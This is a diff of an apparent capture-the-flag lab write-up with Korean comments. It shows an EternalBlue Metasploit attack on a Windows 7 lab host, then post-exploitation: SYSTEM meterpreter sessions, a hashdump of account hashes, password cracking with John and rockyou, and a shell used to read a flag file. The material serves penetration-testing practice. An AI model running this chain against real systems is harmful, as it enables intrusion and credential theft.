@@ -119,6 +119,8 @@ After interacting with a module you can manually set a TARGET with set TARGET 'N
 
 # msf exploit(windows/smb/ms17\*010_eternalblue) > set RHOSTS 10.201.21.43
 
+# show options
+
 RHOSTS => 10.201.21.43
 
 # msf exploit(windows/smb/ms17_010_eternalblue) > run
@@ -237,7 +239,7 @@ msf exploit(windows/smb/ms17_010_eternalblue) > run
 
 # CTF 환경 -> local host setting required -> so then WIN!
 
-# ctrl + z
+# ctrl + z | background
 
 # sessions
 
@@ -340,3 +342,86 @@ msf post(multi/manage/shell_to_meterpreter) >
 meterpreter >
 
 # 10.201.21.43
+
+meterpreter > sysinfo
+Computer : JON-PC
+OS : Windows 7 (6.1 Build 7601, Service Pack 1).
+Architecture : x64
+System Language : en_US
+Domain : WORKGROUP
+Logged On Users : 0
+Meterpreter : x64/windows
+
+# sessions -> PC 사용자 이름 -> JON
+
+Id Name Type Information Connection
+
+---
+
+1 meterpreter x64/windows NT AUTHORITY\SYSTEM @ JON-PC 10.8.136.212:4444 -> 10.201.21.43:49191 (10.201.21.43)
+2 meterpreter x64/windows NT AUTHORITY\SYSTEM @ JON-PC 10.8.136.212:4433 -> 10.201.21.43:49192 (10.201.21.43)
+
+# sessions -i 2
+
+# meterpreter > hashdump
+
+meterpreter > hashdump
+Administrator:500:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
+Guest:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
+Jon:1000:aad3b435b51404eeaad3b435b51404ee:ffb43f0de35be4d9917ac0cc8ad57f8d:::
+
+# kali -> john --format=NT --wordlist=rockyou.txt hash
+
+# john --wordlist=rockyou.txt hash
+
+Warning: detected hash type "LM", but the string is also recognized as "NT"
+Use the "--format=NT" option to force loading these as that type instead
+Using default input encoding: UTF-8
+Using default target encoding: CP850
+Loaded 1 password hash (LM [DES 256/256 AVX2])
+Warning: poor OpenMP scalability for this hash type, consider --fork=8
+Will run 8 OpenMP threads
+Press 'q' or Ctrl-C to abort, almost any other key for status
+(Jon)  
+1g 0:00:00:00 DONE (2025-09-17 14:58) 25.00g/s 1228Kp/s 1228Kc/s 1228KC/s 123456..MEME13
+Use the "--show --format=LM" options to display all of the cracked passwords reliably
+Session completed.
+
+# john --format=NT --wordlist=rockyou.txt hash
+
+Using default input encoding: UTF-8
+Loaded 1 password hash (NT [MD4 256/256 AVX2 8x3])
+Warning: no OpenMP support for this hash type, consider --fork=8
+Press 'q' or Ctrl-C to abort, almost any other key for status
+alqfna22 (Jon)  
+1g 0:00:00:00 DONE (2025-09-17 14:59) 1.075g/s 10968Kp/s 10968Kc/s 10968KC/s alr19882006..alpusidi
+Use the "--show --format=NT" options to display all of the cracked passwords reliably
+Session completed.
+
+# alqfna22 -> found
+
+# meterpreter > search -f \*.txt
+
+# meterpreter > cat c:\flag1.txt
+
+[-] stdapi_fs_stat: Operation failed: The system cannot find the file specified.
+meterpreter > shell
+Process 1552 created.
+Channel 2 created.
+Microsoft Windows [Version 6.1.7601]
+Copyright (c) 2009 Microsoft Corporation. All rights reserved.
+
+C:\Windows\system32>cd ..
+cdcd ..
+
+C:\Windows>cd ..
+cdcd ..
+'cdcd' is not recognized as an internal or external command,
+operable program or batch file.
+
+C:\Windows>cd ..
+cd ..
+
+C:\>type flag1.txt
+type flag1.txt
+flag{access_the_machine}
